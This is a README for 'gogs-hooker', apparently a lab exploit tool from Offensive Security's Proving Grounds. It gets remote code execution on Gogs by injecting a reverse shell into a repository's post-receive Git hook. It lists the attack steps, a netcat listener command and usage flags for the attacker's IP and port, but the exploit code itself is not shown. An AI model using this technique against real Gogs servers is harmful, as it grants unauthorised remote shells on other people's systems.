# gogs-hooker 💀

An authenticated remote code execution exploit targeting Gogs instances via Git hook injection.

This script was created for the Assignment lab on Offensive Security's Proving Grounds.

---

## 💡 What It Does

- Logs into a Gogs instance using valid credentials
- Creates a new private repository
- Injects a reverse shell payload into the post-receive Git hook
- Triggers the hook by pushing a commit, granting you a shell 😈

---

## ⚠️ Requirements

- Python 3.x
- Gogs instance with valid user credentials
- Listener ready (e.g., `nc -lvnp 4444`)

Install the requirements with:

```bash
pip install -r requirements.txt
```

---

## 🚀 Usage

```bash
python3 gogs-hooker.py \
  --url http://target-gogs-url:port/ \
  --username your_username \
  --password your_password \
  --lhost your_ip \
  --lport 4444
```


